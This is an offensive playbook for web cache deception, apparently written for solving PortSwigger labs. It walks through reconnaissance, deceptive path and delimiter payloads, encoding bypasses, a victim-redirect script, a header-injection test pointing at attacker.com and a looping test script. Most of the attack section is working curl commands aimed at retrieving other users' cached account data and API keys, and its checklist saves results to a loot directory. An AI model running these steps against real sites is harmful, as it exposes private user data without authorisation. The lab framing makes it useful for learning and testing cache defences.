# Web Cache Deception Methodology
## Expert Playbook for Cache-Based Attacks

> Exploit misconfigurations between origin servers and caching layers to 
> trick caches into storing sensitive user-specific content.

---

## Phase 1: Understanding the Attack

### 1.1 Core Concept
Web Cache Deception (WCD) exploits a mismatch between:
- **Origin server**: Routes `/account` → returns user-specific content
- **Cache**: Sees `/account/anything.css` → caches it as static resource

When victim visits the crafted URL, the cache stores their private data.
Attacker then requests the same cached URL to retrieve the victim's data.

### 1.2 Prerequisites
1. Cache exists between client and origin (CDN, reverse proxy, Varnish, etc.)
2. Origin serves dynamic content for paths with static-looking extensions
3. Cache uses URL path or extension-based caching rules
4. Victim can be tricked into visiting the crafted URL

---

## Phase 2: Detection & Reconnaissance

### 2.1 Identify Caching Behavior
```bash
# Check for cache headers in response
curl -skI "http://target/" | grep -iE "(cache|x-cache|age|cf-cache|cdn|via|x-served)"

# Common cache indicators:
# X-Cache: HIT/MISS
# Age: <seconds>
# Via: 1.1 varnish
# CF-Cache-Status: HIT (Cloudflare)
# X-Cache-Hits: <count>
# Cache-Control: public, max-age=...
```

### 2.2 Identify Dynamic Endpoints
```bash
# Find authenticated pages that return user-specific content
# Login first to get a session
curl -sk "http://target/login" -d "user=test&pass=test" -c /data/cookies/cookies.txt -D-

# Then check for dynamic pages
curl -sk "http://target/my-account" -b /data/cookies/cookies.txt | head -50
curl -sk "http://target/profile" -b /data/cookies/cookies.txt | head -50
curl -sk "http://target/api/user" -b /data/cookies/cookies.txt | head -50
```

### 2.3 Test Path Handling
```bash
# Test how the origin handles path extensions
# These should still return the account page if vulnerable:
curl -sk "http://target/my-account/x.css" -b /data/cookies/cookies.txt -D- | head -20
curl -sk "http://target/my-account/x.js" -b /data/cookies/cookies.txt -D- | head -20
curl -sk "http://target/my-account/anything.woff2" -b /data/cookies/cookies.txt -D- | head -20
curl -sk "http://target/my-account/test.avif" -b /data/cookies/cookies.txt -D- | head -20
```

---

## Phase 3: Exploitation Techniques

### 3.1 Classic Web Cache Deception
```bash
# Step 1: As authenticated user, request the deceptive URL
curl -sk "http://target/my-account/nonexistent.css" -b /data/cookies/cookies.txt -D-

# Step 2: Check if it was cached (look for X-Cache: HIT or Age > 0)
# Wait a moment, then request WITHOUT cookies (simulating attacker)
sleep 2
curl -sk "http://target/my-account/nonexistent.css" -D- | head -50

# If the response contains the victim's data → WCD confirmed!
```

### 3.2 Path Delimiter / Normalization Attacks
Different servers treat path delimiters differently:

```bash
# Semicolon delimiter (Tomcat, Rails)
curl -sk "http://target/my-account;x.css" -b /data/cookies/cookies.txt -D-

# URL-encoded separators
curl -sk "http://target/my-account%2Fx.css" -b /data/cookies/cookies.txt -D-
curl -sk "http://target/my-account%3Bx.css" -b /data/cookies/cookies.txt -D-
curl -sk "http://target/my-account%23x.css" -b /data/cookies/cookies.txt -D-
curl -sk "http://target/my-account%3Fx.css" -b /data/cookies/cookies.txt -D-

# Dot segment normalization
curl -sk "http://target/assets/..%2Fmy-account" -b /data/cookies/cookies.txt -D-

# Null byte (rare but possible)
curl -sk "http://target/my-account%00.css" -b /data/cookies/cookies.txt -D-
```

### 3.3 Extension-Based Cache Rules
Try different extensions the cache might treat as static:
```bash
# Common cached extensions
for ext in css js png jpg gif ico svg woff woff2 ttf eot avif webp; do
  echo "Testing .$ext..."
  curl -sk "http://target/my-account/test.$ext" -b /data/cookies/cookies.txt -D- | head -5
  sleep 1
done

# Cache might also match on path patterns
curl -sk "http://target/my-account/static/x" -b /data/cookies/cookies.txt -D-
curl -sk "http://target/my-account/assets/x" -b /data/cookies/cookies.txt -D-
curl -sk "http://target/my-account/resources/x" -b /data/cookies/cookies.txt -D-
```

### 3.4 PortSwigger Lab Exploit Pattern
```bash
# 1. Login to get authenticated session cookies
curl -sk "http://LAB_URL/login" -d "username=wiener&password=peter" \
  -c /data/cookies/cookies.txt -L -D-

# 2. Verify /my-account shows our API key
curl -sk "http://LAB_URL/my-account" -b /data/cookies/cookies.txt | grep -i "api\|key\|carlos"

# 3. Find the caching behavior — try deceptive path
curl -sk "http://LAB_URL/my-account/test.js" -b /data/cookies/cookies.txt -D-

# 4. If the account page is returned AND cached:
# Deliver the URL to the victim (exploit server in PortSwigger):
# <script>document.location="http://LAB_URL/my-account/test.js"</script>

# 5. After victim visits, fetch the cached page (no cookies needed)
curl -sk "http://LAB_URL/my-account/test.js" -D-

# 6. Extract the victim's API key from cached response
```

---

## Phase 4: Advanced Techniques

### 4.1 Cache Key Normalization
```bash
# Some caches normalize the key (lowercase, remove query string)
# But the origin doesn't normalize — exploit the mismatch

# Query string variation
curl -sk "http://target/my-account?cachebust=1.css" -b /data/cookies/cookies.txt -D-

# Fragment (usually stripped by cache)
curl -sk "http://target/my-account#.css" -b /data/cookies/cookies.txt -D-
```

### 4.2 Cache Poisoning + Deception Combo
```bash
# If you can control response headers via injection:
# X-Forwarded-Host, X-Original-URL, etc.
curl -sk "http://target/my-account" -H "X-Forwarded-Host: attacker.com" -D-
```

### 4.3 Vary Header Bypass
```bash
# If Vary: Cookie is set, cache keys include cookies
# Try Vary header bypass techniques:
curl -sk "http://target/my-account/test.css" \
  -H "Accept-Encoding: gzip, deflate" -D-
```

---

## Phase 5: Tools

### Cache testing workflow
```bash
# Script to test multiple extensions and check cache headers
for ext in js css png jpg gif woff woff2 svg avif; do
  URL="http://target/my-account/cachebust_$(date +%s).$ext"
  echo "=== Testing $ext ==="
  
  # Request 1: With auth (victim)
  RESP1=$(curl -sk "$URL" -b /data/cookies/cookies.txt -D- -o /dev/null -w "%{http_code}")
  sleep 1
  
  # Request 2: Without auth (attacker)
  HEADERS=$(curl -skI "$URL")
  CACHE_STATUS=$(echo "$HEADERS" | grep -i "x-cache\|age\|cf-cache")
  
  echo "  Status: $RESP1 | Cache: $CACHE_STATUS"
done
```

---

## Common Failure Modes

| Problem | Solution |
|---------|----------|
| Cache returns 404 for crafted path | Origin rejects unknown paths — try delimiter-based attacks |
| Cache-Control: no-store on account page | Try cache poisoning to override, or find another endpoint |
| Vary: Cookie prevents deception | Find endpoints without Vary header, or use cookie-less caching |
| CDN normalizes URL before caching | Use encoding bypass (%2F, %3B) to avoid normalization |
| Lab requires exploit server delivery | Use PortSwigger's exploit server to redirect victim to deceptive URL |
| Response doesn't contain sensitive data | Target different endpoints: /api/me, /settings, /profile |

## Success Criteria
- [ ] Identified cache layer and caching rules
- [ ] Found a dynamic endpoint serving user-specific content
- [ ] Confirmed that the origin serves content for the deceptive path
- [ ] Confirmed the cache stores the response (X-Cache: HIT or Age > 0)
- [ ] Successfully retrieved cached victim data without authentication
- [ ] Lab marked as solved
- [ ] Technique documented in /data/loot/
